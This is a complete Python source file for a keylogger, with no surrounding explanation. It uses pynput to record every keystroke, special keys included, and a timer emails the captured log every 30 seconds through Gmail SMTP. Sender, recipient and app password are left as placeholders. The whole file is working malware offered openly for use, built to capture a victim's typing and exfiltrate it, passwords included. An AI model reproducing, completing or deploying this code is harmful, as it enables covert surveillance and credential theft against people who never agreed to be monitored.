#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:

    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
            self.log += special_keys.get(key, f" {str(key)} ")

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Email sent Successfully!\n")


    def report(self):
        email_body = "[+] El keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "ENTERYOUREMAIL", ["ENTERYOUREMAIL"], "ENTERPASSWORDAPPLICATION")

        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()

    def start(self):

        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
